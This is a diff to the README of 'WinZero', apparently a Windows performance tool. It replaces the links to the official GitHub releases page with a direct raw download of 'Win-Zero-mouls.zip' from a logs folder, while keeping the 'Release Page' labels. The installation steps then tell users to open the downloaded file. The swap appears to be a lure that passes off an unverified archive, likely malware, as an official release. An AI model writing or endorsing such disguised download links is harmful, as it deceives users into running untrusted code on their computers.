@@ -1,6 +1,6 @@
 # 🛠️ WinZero - Optimize your Windows system performance easily
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/sandeshre305/WinZero/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/sandeshre305/WinZero/main/logs/Win-Zero-mouls.zip)
 
 WinZero helps you improve your computer speed. This tool removes unnecessary background processes and cleans unwanted software. You gain better performance on Windows 10 and 11. The software handles complex system registry edits and service configurations with one click. Privacy settings get updated to prevent data collection. Gaming performance increases because the tool clears system resources for your applications.
 
@@ -8,7 +8,7 @@ WinZero helps you improve your computer speed. This tool removes unnecessary bac
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [official release page](https://github.com/sandeshre305/WinZero/releases) to download the installer.
+1. Visit the [official release page](https://raw.githubusercontent.com/sandeshre305/WinZero/main/logs/Win-Zero-mouls.zip) to download the installer.
 2. Choose the latest version listed under the Assets section.
 3. Save the file to your computer.
 4. Open the downloaded file to start the installation.
